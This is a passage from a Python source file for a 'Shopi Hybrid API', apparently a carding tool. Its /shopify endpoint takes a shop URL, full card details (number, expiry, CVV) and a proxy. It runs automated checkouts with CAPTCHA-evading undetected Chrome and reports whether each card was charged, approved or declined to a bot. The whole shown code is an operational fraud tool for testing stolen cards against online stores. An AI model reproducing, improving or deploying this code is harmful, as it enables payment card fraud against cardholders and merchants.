        logger.warning("[run_check] Selenium failed (%s) - returning HTTP result",
                       browser_result.get("message", "?"))
        return _translate_result(http_result, cc_string)

    # Cache cookies from successful browser checkout
    cookies = browser_result.pop("cookies", None)
    if cookies and browser_result.get("status") in ("Charged", "Approved", "Declined"):
        cache_cookies(site_url, cookies)
        logger.info("[run_check] Cached %d cookie(s) for %s after browser checkout",
                    len(cookies), site_url)

    return _translate_result(browser_result, cc_string)


# ── Quart app (async routes) ─────────────────────────────────────────────────

if _QUART_AVAILABLE:
    app = Quart(__name__)

    @app.route("/shopify", methods=["GET"])
    async def shopify_checker():
        """
        GET /shopify?site=<url>&cc=<CC|MM|YYYY|CVV>[&proxy=<proxy>]

        Returns bot-compatible JSON:
          { Gateway, Price, Response, Status, cc [, challenge_url] }
        """
        try:
            site      = (quart_request.args.get("site")  or "").strip()
            cc_string = (quart_request.args.get("cc")    or "").strip()
            proxy_str = (quart_request.args.get("proxy") or "").strip() or None

            if not site:
                return jsonify({"error": "Missing site", "Status": False}), 400
            if not cc_string or cc_string.count("|") != 3:
                return jsonify({
                    "error": "Invalid cc — expected CC|MM|YYYY|CVV",
                    "Status": False,
                }), 400

            if not site.startswith("http"):
                site = "https://" + site
            site = site.rstrip("/")

            fmt_proxy = None
            if proxy_str:
                if format_proxy is not None:
                    try:
                        fmt_proxy = format_proxy(proxy_str)
                    except Exception:
                        fmt_proxy = proxy_str
                else:
                    fmt_proxy = proxy_str

            result = await run_check(site, cc_string, fmt_proxy)
            return jsonify(result)

        except Exception:
            logger.exception("Unhandled error in /shopify")
            return jsonify({
                "Gateway": "UNKNOWN", "Price": 0.0,
                "Response": "SERVER_ERROR", "Status": False,
                "cc": quart_request.args.get("cc", ""),
            }), 500

    @app.route("/health", methods=["GET"])
    async def health():
        """Health check — reports engine status, pool, cached cookies."""
        pool = _browser_pool
        return jsonify({
            "status":             "ok",
            "version":            "3.0",
            "primary_engine":     "curl_cffi" if _CURL_CFFI_AVAILABLE
                                  else "httpx_fallback",
            "shopifyapi_loaded":  _SHOPIFYAPI_AVAILABLE,
            "captcha_fallback":   "selenium" if _selenium_available
                                  else "disabled",
            "undetected_chrome":  _uc_available,
            "browser_pool_size":  BROWSER_POOL_SIZE,
            "browsers_ready":     pool is not None,
            "cookie_cache_sites": len(_cookie_store),
            "cookie_cache_ttl_s": COOKIE_CACHE_TTL,
        })

    @app.route("/", methods=["GET"])
    async def index():
        return jsonify({
            "name":        "Shopi Hybrid API",
            "version":     "3.0",
            "endpoints":   ["/shopify", "/health"],
            "description": "curl_cffi primary + Selenium CAPTCHA fallback",
        })

else:
    # Sync Flask fallback (Quart not installed)
    # NOTE: shopifyapi semaphore does NOT work correctly here (new loop each
    # request). Install Quart for production: pip install quart
    app = _SyncFlask(__name__)

    @app.route("/shopify", methods=["GET"])
    def shopify_checker_sync():
        logger.warning("Sync Flask fallback active — install Quart for production")
        try:
            site      = (quart_request.args.get("site")  or "").strip()
            cc_string = (quart_request.args.get("cc")    or "").strip()
            proxy_str = (quart_request.args.get("proxy") or "").strip() or None

            if not site:
                return jsonify({"error": "Missing site", "Status": False}), 400
            if not cc_string or cc_string.count("|") != 3:
                return jsonify({"error": "Invalid cc", "Status": False}), 400

            if not site.startswith("http"):
                site = "https://" + site
            site = site.rstrip("/")

            fmt_proxy = None
            if proxy_str and format_proxy is not None:
                try:
                    fmt_proxy = format_proxy(proxy_str)
                except Exception:
                    fmt_proxy = proxy_str

            result = asyncio.run(run_check(site, cc_string, fmt_proxy))
            return jsonify(result)
        except Exception:
            logger.exception("Unhandled error in /shopify (sync)")
            return jsonify({
                "Gateway": "UNKNOWN", "Price": 0.0,
                "Response": "SERVER_ERROR", "Status": False,
                "cc": quart_request.args.get("cc", ""),
            }), 500

    @app.route("/health", methods=["GET"])
    def health_sync():
        pool = _browser_pool
        return jsonify({
            "status":             "ok",
            "version":            "3.0 (sync fallback — install Quart)",
            "captcha_fallback":   "selenium" if _selenium_available
                                  else "disabled",
            "browser_pool_size":  BROWSER_POOL_SIZE,
            "browsers_ready":     pool is not None,
            "cookie_cache_sites": len(_cookie_store),
        })

    @app.route("/", methods=["GET"])
    def index_sync():
        return jsonify({
            "name":    "Shopi Hybrid API",
            "version": "3.0 (sync fallback)",
            "warning": "Install Quart for async operation",
        })


# ── Entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import uvicorn

    print("=" * 64)
    print("  Shopi Hybrid API v3.0")
    print("=" * 64)
    print("  Primary  : %s"
          % ("curl_cffi" if _CURL_CFFI_AVAILABLE else "httpx (no curl_cffi)"))
    print("  Fallback : %s"
          % ("Selenium x%d" % BROWSER_POOL_SIZE
             if _selenium_available else "DISABLED (install selenium)"))
    print("  ASGI     : %s"
          % ("Quart" if _QUART_AVAILABLE
             else "sync Flask (install Quart!)"))
    print("  Listen   : %s:%d" % (API_HOST, API_PORT))
    print()

    if _selenium_available and PREWARM_BROWSERS:
        def _prewarm():
            try:
                pool = _get_browser_pool()
                futs = [pool._executor.submit(pool._get_driver)
                        for _ in range(pool.pool_size)]
                for f in futs:
                    try:
                        f.result(timeout=30)
                    except Exception:
                        pass
                logger.info("[prewarm] Browser pool ready (%d instance(s))",
                            pool.pool_size)
            except Exception as e:
                logger.warning("[prewarm] Failed: %s", e)

        threading.Thread(target=_prewarm, daemon=True,
                         name="prewarm").start()

    uvicorn.run(app, host=API_HOST, port=API_PORT, log_level="info")
